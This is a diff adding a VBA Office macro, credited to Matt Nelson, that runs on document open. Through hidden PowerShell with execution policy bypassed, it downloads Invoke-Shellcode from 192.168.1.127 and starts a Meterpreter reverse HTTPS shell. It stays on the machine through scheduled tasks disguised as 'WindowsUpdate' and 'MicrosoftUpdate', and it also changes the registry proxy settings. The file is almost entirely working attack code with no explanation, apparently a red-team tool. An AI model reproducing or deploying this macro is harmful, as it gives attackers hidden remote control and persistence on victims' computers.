@@ -1,0 +1,62 @@
+' Author: Matt Nelson
+' Twitter: @enigma0x3
+
+Sub Auto_Open()
+
+Execute
+Persist
+
+End Sub
+
+ Public Function Proxy() As Variant
+     
+     Const HIDDEN_WINDOW = 0
+        strComputer = "."
+        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+        Set objConfig = objStartup.SpawnInstance_
+        objConfig.ShowWindow = HIDDEN_WINDOW
+        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c Invoke-Command -ScriptBlock { $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections'; $data = (Get-ItemProperty -Path $key -name DefaultConnectionSettings).DefaultConnectionSettings; $data[8] = 1; Set-ItemProperty -Path $key -Name DefaultConnectionSettings -Value $data}", Null, objConfig, intProcessID
+    
+     End Function
+
+     Public Function Execute() As Variant
+        Const HIDDEN_WINDOW = 0
+        strComputer = "."
+        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+        Set objConfig = objStartup.SpawnInstance_
+        objConfig.ShowWindow = HIDDEN_WINDOW
+        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('http://192.168.1.127/Invoke-Shellcode')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.127 -Lport 1111 -Force", Null, objConfig, intProcessID
+     End Function
+
+      
+     Public Function Persist() As Variant
+        Const HIDDEN_WINDOW = 0
+        strComputer = "."
+        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+        
+        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+        Set objConfig = objStartup.SpawnInstance_
+        objConfig.ShowWindow = HIDDEN_WINDOW
+        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+        objProcess.Create "Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c Invoke-Command -ScriptBlock { schtasks /create  /TN WindowsUpdate /TR 'powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c ''IEX ((New-Object Net.WebClient).DownloadString(''''http://192.168.1.127/Invoke-Shellcode''''''))''; Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.127 -Lport 1111 -Force' /SC onidle /i 20}", Null, objConfig, intProcessID
+     End Function
+      Public Function ProxyKillTask() As Variant
+        Const HIDDEN_WINDOW = 0
+        strComputer = "."
+        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+        
+        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+        Set objConfig = objStartup.SpawnInstance_
+        objConfig.ShowWindow = HIDDEN_WINDOW
+        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+        objProcess.Create "Powershell.exe -ep Bypass -c icm -ScriptBlock {schtasks /create /TN MicrosoftUpdate /TR 'powershell.exe -ep Bypass -c icm -ScriptBlock {$k = ''''''HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections''''''''; $n = ''''''DefaultConnectionSettings''''''''; $d = (gp -Path $k -Name $n).$n; $d[8] = 1; sp -Path $k -Name $n -Value $d}' /SC onidle /i 20}", Null, objConfig, intProcessID
+     End Function
+     
+     
+     
